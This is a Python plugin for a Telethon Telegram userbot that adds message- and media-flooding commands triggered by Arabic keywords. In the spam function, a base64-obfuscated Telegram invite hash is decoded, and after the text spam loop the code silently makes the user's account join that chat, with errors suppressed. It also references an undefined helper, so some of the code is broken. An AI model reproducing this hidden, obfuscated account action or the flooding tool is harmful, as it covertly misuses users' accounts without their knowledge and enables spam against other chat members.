import asyncio
import base64
from telethon.tl import functions, types
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from iqthon import iqthon
@iqthon.on(events.NewMessage(outgoing=True, pattern="^.تكرار (.*)"))
async def spammer(event):
    kno1 = await event.get_reply_message()
    kno = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(kno[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, kno1, kno, sleeptimem, sleeptimet)
@iqthon.on(events.NewMessage(outgoing=True, pattern="^.(كاج|مؤقت|كار|كجج|مكرر|كج|كرر) (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    kno = input_str[1:]
    await event.delete()
    await spam_function(event, reply, kno, sleeptimem, sleeptimet, DelaySpam=True)
async def spam_function(event, kno1, kno, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    counter = int(kno[0])
    if len(kno) == 2:
        spam_message = str(kno[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await kno1.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and kno1.media:
        for _ in range(counter):
            kno1 = await event.client.send_file(event.chat_id, kno1, caption=kno1.text)
            await _knoutils.unsavegif(event, kno1)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and kno1.text:
        spam_message = kno1.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass
